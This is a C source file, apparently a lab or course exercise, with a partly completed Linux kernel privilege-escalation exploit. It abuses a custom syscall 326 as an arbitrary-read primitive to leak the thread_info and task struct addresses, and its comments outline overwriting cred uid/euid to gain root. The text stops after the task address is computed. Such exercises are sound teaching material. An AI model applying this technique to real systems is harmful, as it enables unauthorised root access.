#include <stdio.h>
#include <unistd.h>
void runExploit() {
    // First, locate thread info using provided system call. Check kernel source code.
    // Next, you need to find thread_info->task->cred
    //
    // 1.  Use GDB to calculate the offset in the structure and find what is the relationship between thread_info and thread_info->task, struct task and task->cred, struct cred and cred->uid/cred->euid.
    //     For example:
    //     (gdb) print (int)&((struct thread_info*)0)->task
    //     will gives you the offset between struct thread_info and  thread_info->task
    // 2. Then you can make use of arbitrary read to get the address of struct task.
    // 3. Similarly, you can get the address of struct cred, uid/euid finally with the help of arbitrary read.

    // Finally, you will need to rewrite the uid/euid in cred struct and give your process highest privilege


        //[:+:]-------------------------------------------My Code----------------------------------------------[:+:]//

        //Reset the list and use the syscall to get the address of the thread_info struct
        syscall(326, 0, NULL);
        unsigned long thrdAddy = syscall(326, 4, NULL);

        //Use the syscall to link the prev pointer of the first node onto thread_into, we will treat thread_info as if it were another node. 
        //Since the offset between threa_info and task* os 0, we dont need to add anything to thread_info address
        //thread_info's task* pointer is located in the same place that a regular node's 'prio' field would be.
        //This means, that when we invoke the syscall to get the prio from the first node's 'prev' it will instead take us to a portion of the task struct's address
        //Because the address is 8  bytes instad of 4 bytes, we would need to get the first 4 bytes, then left shift by 32 bits to make enough room to add the next 4 bytes
        syscall(326, 2, thrdAddy);
        unsigned long taskAddy1stHalf= syscall(326,3,NULL);

        //Since the address can only store 4 bytes, we have to move 4 bytes to get the second half of the address, then aquire it by invoking 'prio' like before
        syscall(326,2,thrdAddy-4);
        unsigned long taskAddy2ndHalf= syscall(326, 3,NULL);

        //We shift the first half by 32 bits to make room for the second half, then we combine them into one 8-byte long variable
        unsigned long taskAddyFull= (taskAddy1stHalf << 32) + taskAddy2ndHalf;

